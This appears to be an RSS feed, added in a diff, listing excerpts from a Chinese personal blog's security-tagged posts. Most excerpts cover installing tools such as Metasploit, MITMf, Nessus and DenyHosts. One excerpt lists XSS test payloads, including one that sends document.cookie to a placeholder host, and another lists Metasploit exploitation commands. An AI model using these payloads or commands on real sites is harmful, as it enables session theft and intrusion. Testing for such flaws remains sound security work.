@@ -1,0 +1,110 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>网络安全 on Hi~Roy!</title>
+    <link>/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link>
+    <description>Recent content in 网络安全 on Hi~Roy!</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Mon, 28 Dec 2015 17:56:42 +0000</lastBuildDate><atom:link href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>centos7安装Metasploit框架</title>
+      <link>/posts/centos7%E5%AE%89%E8%A3%85metasploit%E6%A1%86%E6%9E%B6/</link>
+      <pubDate>Mon, 28 Dec 2015 17:56:42 +0000</pubDate>
+      
+      <guid>/posts/centos7%E5%AE%89%E8%A3%85metasploit%E6%A1%86%E6%9E%B6/</guid>
+      <description>Metasploit应该不用多说了吧？Kali自带、Win和Mac都提供了现成的安装包，不过我莫名的对apt系不感冒，这里记录一下在centos7上安装metasploit框架的步骤，理论上yum系的都应该通用。 首先执行
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstallchmod 755 msfinstall./msfinstall然后安装postgresql：</description>
+    </item>
+    
+    <item>
+      <title>MacOS安装Wireshark-qt</title>
+      <link>/posts/macos%E5%AE%89%E8%A3%85wiresharkqt/</link>
+      <pubDate>Mon, 06 Apr 2015 11:29:54 +0000</pubDate>
+      
+      <guid>/posts/macos%E5%AE%89%E8%A3%85wiresharkqt/</guid>
+      <description>大名鼎鼎的Wireshark不必多说，在win、linux系统中安装也都比较便捷，不过在网上大多写MacOS中如何安装的都狠麻烦，因为他们写的都是安装gtk版本的方式，而wireshark早就投入了qt阵营的怀抱了。
+在brew中直接使用brew install wireshark --with-qt即可安装成功，不过安装后会提示:
+&amp;gt; If your list of available capture interfaces is empty&amp;gt; (default OS X behavior), try the following commands:&amp;gt; curl https://bugs.</description>
+    </item>
+    
+    <item>
+      <title>fedora21安装MITMf框架</title>
+      <link>/posts/fedora21%E5%AE%89%E8%A3%85mitmf%E6%A1%86%E6%9E%B6/</link>
+      <pubDate>Thu, 02 Apr 2015 14:42:02 +0000</pubDate>
+      
+      <guid>/posts/fedora21%E5%AE%89%E8%A3%85mitmf%E6%A1%86%E6%9E%B6/</guid>
+      <description>关于这大名鼎鼎的中间人攻击框架不多介绍了，如果是kali linux用户直接apt-get install mitmf即可;如果是win用户呢，基本就放弃吧;如果是os x用户呢，有几个依赖我始终安装失败，你要安装成功了请联系我。
+网上很多都是讲ubuntu怎么安装这个框架的，这里我记录一下在fedora21上我的安装记录。
+首先安装一些系统依赖，这里我系统原来就安装了很多杂七杂八的东西，不保证下面的就是齐全的：
+sudo yum install libnetfilter_queue-develsudo yum install libffi-develsudo yum install libpcap-devel接下来下载一个不能用pip安装的包</description>
+    </item>
+    
+    <item>
+      <title>xss测试用例</title>
+      <link>/posts/xss%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/</link>
+      <pubDate>Wed, 10 Dec 2014 21:43:58 +0000</pubDate>
+      
+      <guid>/posts/xss%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/</guid>
+      <description>摘录于《XSS跨站脚本攻击剖析与防御》，希望大家支持正版，写的还是不错的。
+&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;xxx://xxx.xxx&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;location.href=&amp;#34;xxx://xxx.xx/cookie=&amp;#34;+escape(document.cookie)&amp;lt;/script&amp;gt; &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/scr&amp;lt;script&amp;gt;ipt&amp;gt; &amp;lt;script&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/script&amp;gt; &amp;lt;img src=xx.png onerror=alert(/xss/) /&amp;gt; &amp;lt;style&amp;gt;@im\port&amp;#39;\ja\vasc\ript:alert(\&amp;#34;xss\&amp;#34;);&amp;lt;/style&amp;gt; &amp;lt;?</description>
+    </item>
+    
+    <item>
+      <title>iptables禁止某Ip</title>
+      <link>/posts/iptables%E7%A6%81%E6%AD%A2%E6%9F%90ip/</link>
+      <pubDate>Mon, 17 Nov 2014 09:55:58 +0000</pubDate>
+      
+      <guid>/posts/iptables%E7%A6%81%E6%AD%A2%E6%9F%90ip/</guid>
+      <description>今天登录服务器一看，好家伙：
+tcp 0 0 198.74.121.150:80 38.103.160.12:33873 TIME_WAIT - tcp 0 0 198.</description>
+    </item>
+    
+    <item>
+      <title>metasploit命令参考</title>
+      <link>/posts/metasploit%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83/</link>
+      <pubDate>Fri, 24 Oct 2014 17:18:46 +0000</pubDate>
+      
+      <guid>/posts/metasploit%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83/</guid>
+      <description>节选自《metasploit渗透测试指南》
+show exploits 列出所有渗透攻击模块show payloads 列出所有攻击载荷show auxiliary 列出所有辅助模块search name 搜索info 列出详细信息use name 使用show options 查看参数show targets 查看某模块支持的目标平台show advanced 查看高级选项set autorunscript migrate -f 攻击完成后自动迁移到另一个进程check 检测目标是否对选定的渗透攻击存在相应的漏洞exploit 执行渗透攻击exploit -j 后台执行exploit -z 成功渗透后不与会话交互exploit -e encoder 指定攻击载荷编码方式exploit -h 帮助sessions -l 列出多个会话sessions -l -v 列出会话同时列出详细信息sessions -s scritp 在所有活跃会话中执行特定meterpreter脚本sessions -K 杀死所有活跃会话sessions -c cmd 在所有活跃会话上执行某命定sessions -u sessionID 升级一个普通的win shell 到 meterpreter shelldb_conreate name 创建数据库db_connect name 链接数据库db_namp 把namp的扫描结果存入数据库 hosts services查看结果db_autopwn -hdb_autopwn -p -r-e 对发现的所有端口执行db_autopwndb_destroy 删除当前数据库db_destory user:pswd@host:port/dbnamedb_status 查看 meterpreter命令</description>
+    </item>
+    
+    <item>
+      <title>centos安装denyhosts</title>
+      <link>/posts/centos%E5%AE%89%E8%A3%85denyhosts/</link>
+      <pubDate>Mon, 20 Oct 2014 17:37:42 +0000</pubDate>
+      
+      <guid>/posts/centos%E5%AE%89%E8%A3%85denyhosts/</guid>
+      <description>最近不知道得罪了哪路大神，一直都有坏人暴力破解本站的SSH登录密码。想安安静静的写博客就这么难么&amp;hellip;没办法，那就安个denyhosts吧。
+centos下直接使用Yum安装即可:yum install denyhosts.noarch
+当然也可以下载编译安装。安装好后，配置文件是/etc/denyhosts.conf,参数说明如下:
+SECURE_LOG = /var/log/secure#ssh日志文件
+HOSTS_DENY = /etc/hosts.</description>
+    </item>
+    
+    <item>
+      <title>nessus使用记录</title>
+      <link>/posts/nessus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
+      <pubDate>Sun, 28 Sep 2014 09:34:55 +0000</pubDate>
+      
+      <guid>/posts/nessus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
+      <description>至于介绍以及安装部分这里不再赘述，网上很多，可以直接下载rpm包进行安装。
+fedora20安装后需要启动服务：sudo service nessusd start
+浏览器访问 https://localhost:8834 即可看到nessus主界面。第一次使用时候需要注册码，翻墙去官方网站注册一个即可。
+首先我们需要创建一个Policy，点击policies标签页后选择new policy，会弹出一个Policy Wizards 选择，这里我选择web application tests。</description>
+    </item>
+    
+    <item>
+      <title>64位kali安装skype</title>
+      <link>/posts/64%E4%BD%8Dkali%E5%AE%89%E8%A3%85skype/</link>
+      <pubDate>Sun, 01 Jun 2014 08:36:23 +0000</pubDate>
+      
+      <guid>/posts/64%E4%BD%8Dkali%E5%AE%89%E8%A3%85skype/</guid>
+      <description>参考了debian7的安装方式,首先运行:
+# dpkg --add-architecture i386 # apt-get update 最初的时候64位系统是无法安装32位程序的。
+然后安装相关依赖:</description>
+    </item>
+    
+  </channel>
+</rss>
